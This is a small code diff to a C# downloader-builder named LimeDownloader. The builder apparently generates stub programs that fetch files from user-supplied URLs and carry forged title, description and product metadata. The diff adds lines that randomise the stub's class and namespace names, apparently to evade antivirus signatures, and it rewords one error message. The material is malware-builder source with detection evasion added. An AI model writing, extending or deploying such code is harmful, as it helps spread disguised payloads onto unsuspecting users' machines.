@@ -74,7 +74,7 @@ namespace LimeDownloader
                     }
                     catch (BadImageFormatException)
                     {
-                        result = "Invalid Assembly";
+                        result = "Invalid .NET Assembly";
                     }
                 }
             });
@@ -295,6 +295,8 @@ namespace LimeDownloader
 
                     string Source = Properties.Resources.Stub;
                     Source = Source.Replace("$URL$", string.Join(", ", URLS.ToList()).Replace(",", Strings.ChrW(34) + "," + Strings.ChrW(34)));
+                    Source = Source.Replace("Stubclass", Randomi(rand.Next(10, 20)));
+                    Source = Source.Replace("LimeDownloader_Stubnamespace", Randomi(rand.Next(10, 20)));
                     Source = Source.Replace("%Title%", txtTitle.Text);
                     Source = Source.Replace("%Description%", txtDescription.Text);
                     Source = Source.Replace("%Product", txtProduct.Text);
